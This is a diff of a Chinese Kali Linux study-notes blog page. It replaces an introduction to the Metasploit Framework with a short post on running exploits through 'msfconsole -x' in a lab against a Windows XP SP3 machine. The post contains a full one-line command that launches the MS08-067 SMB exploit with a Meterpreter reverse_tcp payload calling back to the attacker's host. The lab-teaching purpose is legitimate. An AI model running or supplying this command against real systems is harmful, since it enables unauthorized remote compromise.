@@ -79,21 +79,16 @@
 
 
 
-<meta name="description" content="1. Metasploit简介 目前最流行、最强大、最具扩展性的渗透测试平台软件 基于Metasploit进行渗透测试和漏洞分析的流程和方法 2003年由HD More发布第一版，2007年用ruby语言重写 框架继承了渗透测试标准（PETS）思想 一定程度上统一了渗透测试和漏洞研究的工作环境 新的攻击代码可以比较容易的加入框架   开发活跃版本更新频繁（每周） 早期版本基于社区力量维护，被Ra">
+<meta name="description" content="1. Msfcli 2015年6月已经被取消 由🔺命令：msfconsole -x取代 编写脚本时便于引用，可调用自写的脚本 🔺命令：msfconsole -x &amp;quot;use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows&#x2F;meterpreter&#x2F; reverse_tcp; set">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(九十七)：Metasploit Framework">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;17&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%83)%EF%BC%9AMetasploit%20Framework&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(九十八)：MSF--msfcli控制台命令">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;26&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B9%9D)%EF%BC%9AMSF--msfcli%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="1. Metasploit简介 目前最流行、最强大、最具扩展性的渗透测试平台软件 基于Metasploit进行渗透测试和漏洞分析的流程和方法 2003年由HD More发布第一版，2007年用ruby语言重写 框架继承了渗透测试标准（PETS）思想 一定程度上统一了渗透测试和漏洞研究的工作环境 新的攻击代码可以比较容易的加入框架   开发活跃版本更新频繁（每周） 早期版本基于社区力量维护，被Ra">
+<meta property="og:description" content="1. Msfcli 2015年6月已经被取消 由🔺命令：msfconsole -x取代 编写脚本时便于引用，可调用自写的脚本 🔺命令：msfconsole -x &amp;quot;use exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows&#x2F;meterpreter&#x2F; reverse_tcp; set">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=144aVD96LCB_5xdUWmKebc7BkchWv2QVQtOqNq30xve4KObh2u7BhrX1JMqY0H1NUibxS0qASTL2uCv7gEALUQMlJlr4ndyXh4x71-rFR6DefFqkhxJy4gFHfFaqLzJEd0cAFbqPvAr5oLuNxRHTOlhMn_SjoA&amp;file_name=&#x2F;Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E4%B8%AD%E6%96%87%E7%89%88.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=84fcBHLJJTY5FAluOqNf2Tw1IALdMGqUsf9wF1A0g3ihI1xneE6PAQmBU28jS3mcyPGMdXP_JkkVvO4d1ISJ8arU1B22FvM6IN2YNv7OH_dpHXF1U-F1AOTIkMpOLcWZNV4jXdNeVWw_PyE-1sAHflwaXdKDHA&amp;file_name=&#x2F;Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E8%8B%B1%E6%96%87%E7%89%88.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=ea735c3HGYl5hKCwmuyFtToahfu60TTSlvWTOqfWWNafPKL2NPjb7i6KIEG67_ZKQ7h0EM7yCATB3PtW2gVy1CFw0EXvsy3an65x7EFTbtT3asqRSVWuJ4eb1tb_LwAin0zmqEU7OA&amp;file_name=&#x2F;Metasploit%E7%89%88%E6%9C%AC%E5%AF%B9%E6%AF%94.PNG">
-<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=b235UCYkpqOIBeYNf7kc5HlxJ0eWYh1S2O-jFz2VRLpa6pUG6JUo5HyE8BT2tjxe_FwhwuCItZ2hfi_cTywJU1vg1h6fnntH3PG51uPW5-Pjs3UG2xl8JmTb&amp;file_name=&#x2F;MSF%E6%9E%B6%E6%9E%84.PNG">
-<meta property="og:updated_time" content="2020-02-17T15:02:29.003Z">
+<meta property="og:updated_time" content="2020-02-26T07:27:47.213Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=144aVD96LCB_5xdUWmKebc7BkchWv2QVQtOqNq30xve4KObh2u7BhrX1JMqY0H1NUibxS0qASTL2uCv7gEALUQMlJlr4ndyXh4x71-rFR6DefFqkhxJy4gFHfFaqLzJEd0cAFbqPvAr5oLuNxRHTOlhMn_SjoA&amp;file_name=&#x2F;Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E4%B8%AD%E6%96%87%E7%89%88.PNG">
 
 
 
@@ -123,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2020/02/17/Kali Linux笔记(九十七)：Metasploit Framework/"/>
+  <link rel="canonical" href="http://yoursite.com/2020/02/26/Kali Linux笔记(九十九)：MSF--msfcli控制台命令/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(九十七)：Metasploit Framework | Tomas'Blog</title>
+  <title>Kali Linux笔记(九十八)：MSF--msfcli控制台命令 | Tomas'Blog</title>
   
 
 
@@ -248,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%83)%EF%BC%9AMetasploit%20Framework/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B9%9D)%EF%BC%9AMSF--msfcli%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -265,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十七)：Metasploit Framework</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十八)：MSF--msfcli控制台命令</h1>
         
 
         <div class="post-meta">
@@ -277,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-17T23:03:27+08:00">
-                2020-02-17
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-26T15:28:02+08:00">
+                2020-02-26
               </time>
             
 
@@ -331,7 +326,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  613 字
+                  165 字
                 </span>
               
 
@@ -347,7 +342,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  2 分钟
+                  1 分钟
                 </span>
               
             </div>
@@ -369,75 +364,24 @@
 
       
         <hr>
-<h4 id="1-Metasploit简介"><a href="#1-Metasploit简介" class="headerlink" title="1. Metasploit简介"></a>1. Metasploit简介</h4><ul>
-<li>目前最流行、最强大、最具扩展性的渗透测试平台软件</li>
-<li>基于Metasploit进行渗透测试和漏洞分析的流程和方法</li>
-<li>2003年由HD More发布第一版，2007年用ruby语言重写<ul>
-<li>框架继承了渗透测试标准（PETS）思想</li>
-<li>一定程度上统一了渗透测试和漏洞研究的工作环境</li>
-<li>新的攻击代码可以比较容易的加入框架</li>
+<h4 id="1-Msfcli"><a href="#1-Msfcli" class="headerlink" title="1. Msfcli"></a>1. Msfcli</h4><ul>
+<li>2015年6月已经被取消</li>
+<li>由<strong><code>🔺命令：msfconsole -x</code></strong>取代</li>
+<li>编写脚本时便于引用，可调用自写的脚本</li>
+<li><strong><code>🔺命令：msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/ reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit&quot;</code></strong></li>
+</ul>
+<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
+<li>Kali主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
 </ul>
 </li>
-<li>开发活跃版本更新频繁（每周）<ul>
-<li>早期版本基于社区力量维护，被Rapid 7收购后打造出其商业版产品</li>
-<li>目前分化为四个版本，社区版本依然十分活跃</li>
-<li>HD More说：为Metasploit写书是种自虐！</li>
-<li>2014年之后市场上没有再出现新的Metasploit教材</li>
+<li>Window XP SP3主机<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li>关闭防火墙，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
 </ul>
 </li>
-<li>MSF默认集成与Kali Linux之中</li>
-<li>使用postgresql数据库存储数据<ul>
-<li>早期版本需要先启动数据库再启动msf</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-Offensive-security出版的Metasploit教材"><a href="#2-Offensive-security出版的Metasploit教材" class="headerlink" title="2. Offensive security出版的Metasploit教材"></a>2. Offensive security出版的Metasploit教材</h4><ul>
-<li>被HD More称之为当时最好的Metasploit教材（2011/2012）</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=144aVD96LCB_5xdUWmKebc7BkchWv2QVQtOqNq30xve4KObh2u7BhrX1JMqY0H1NUibxS0qASTL2uCv7gEALUQMlJlr4ndyXh4x71-rFR6DefFqkhxJy4gFHfFaqLzJEd0cAFbqPvAr5oLuNxRHTOlhMn_SjoA&file_name=/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E4%B8%AD%E6%96%87%E7%89%88.PNG" alt="Metasploit渗透测试指南中文版"></p>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=84fcBHLJJTY5FAluOqNf2Tw1IALdMGqUsf9wF1A0g3ihI1xneE6PAQmBU28jS3mcyPGMdXP_JkkVvO4d1ISJ8arU1B22FvM6IN2YNv7OH_dpHXF1U-F1AOTIkMpOLcWZNV4jXdNeVWw_PyE-1sAHflwaXdKDHA&file_name=/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E8%8B%B1%E6%96%87%E7%89%88.PNG" alt="Metasploit渗透测试指南英文版"></p>
-<h4 id="3-版本对比"><a href="#3-版本对比" class="headerlink" title="3. 版本对比"></a>3. 版本对比</h4><ul>
-<li>Pro版是企业级全功能的高级渗透测试平台</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ea735c3HGYl5hKCwmuyFtToahfu60TTSlvWTOqfWWNafPKL2NPjb7i6KIEG67_ZKQ7h0EM7yCATB3PtW2gVy1CFw0EXvsy3an65x7EFTbtT3asqRSVWuJ4eb1tb_LwAin0zmqEU7OA&file_name=/Metasploit%E7%89%88%E6%9C%AC%E5%AF%B9%E6%AF%94.PNG" alt="Metasploit版本对比"></p>
-<h4 id="4-MSF架构"><a href="#4-MSF架构" class="headerlink" title="4. MSF架构"></a>4. MSF架构</h4><p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=b235UCYkpqOIBeYNf7kc5HlxJ0eWYh1S2O-jFz2VRLpa6pUG6JUo5HyE8BT2tjxe_FwhwuCItZ2hfi_cTywJU1vg1h6fnntH3PG51uPW5-Pjs3UG2xl8JmTb&file_name=/MSF%E6%9E%B6%E6%9E%84.PNG" alt="MSF架构"></p>
-<ul>
-<li>Rex<ul>
-<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
-<li>处理socket连接访问、协议应答（http/SSL/SMB等）</li>
-<li>编码转换（XOR、Base64、Unicode）</li>
-</ul>
-</li>
-<li>Msf::Core<ul>
-<li>提供Msf的核心基本API，是框架的核心能力实现库</li>
-</ul>
-</li>
-<li>Msf::Base<ul>
-<li>提供友好的API接口，便于模块调用的库</li>
-</ul>
-</li>
-<li>Plugin插件<ul>
-<li>连接和调用外部扩展功能和系统</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-MSF模块"><a href="#5-MSF模块" class="headerlink" title="5. MSF模块"></a>5. MSF模块</h4><ul>
-<li>/usr/share/metasploit-framework/modules/</li>
-<li>技术功能模块（非流程模块）<ul>
-<li>Exploit：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
-<li>Payload：成功exploit之后，真正在目标系统执行的代码或指令<ul>
-<li>Shellcode或系统命令</li>
-<li>三种Payload：/usr/share/metasploit-framework/modules/payloads/</li>
-<li>Single：all-in-one</li>
-<li>Stager：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li>
-<li>Stagers：利用stager建立的连接下载的后续payload</li>
-<li>Stager、Stagers都有多种类型，适用于不同场景</li>
-<li>Shellcode是payload的一种，由于其建立正向/反向shell而得名</li>
-</ul>
-</li>
-<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有payload的exploit模块）</li>
-<li>Encoders：对payload进行加密，躲避AV检查的模块</li>
-<li>Nops：提高payload稳定性及维持大小</li>
+<li>Kali主机<ul>
+<li><strong><code>🔺命令：msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST Window XP的IP; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST Kali的IP; set LPORT 5555; set target 34; exploit&quot;</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -471,8 +415,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AD)%EF%BC%9AVeil-Catapult/" rel="next" title="Kali Linux笔记(九十六)：Veil-Catapult">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十六)：Veil-Catapult
+              <a href="/2020/02/26/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AB)%EF%BC%9AMSF--msfconsole%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4/" rel="next" title="Kali Linux笔记(九十八)：MSF--msfconsole控制台命令">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十八)：MSF--msfconsole控制台命令
               </a>
             
           </div>
@@ -480,10 +424,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/02/18/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7(%E4%B8%80)%EF%BC%9ADirsearch/" rel="prev" title="渗透工具(一)：Dirsearch">
-                渗透工具(一)：Dirsearch <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -653,7 +593,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Metasploit简介"><span class="nav-number">1.</span> <span class="nav-text">1. Metasploit简介</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-Offensive-security出版的Metasploit教材"><span class="nav-number">2.</span> <span class="nav-text">2. Offensive security出版的Metasploit教材</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-版本对比"><span class="nav-number">3.</span> <span class="nav-text">3. 版本对比</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-MSF架构"><span class="nav-number">4.</span> <span class="nav-text">4. MSF架构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-MSF模块"><span class="nav-number">5.</span> <span class="nav-text">5. MSF模块</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Msfcli"><span class="nav-number">1.</span> <span class="nav-text">1. Msfcli</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-实验"><span class="nav-number">2.</span> <span class="nav-text">2. 实验</span></a></li></ol></div>
             
 
           </div>
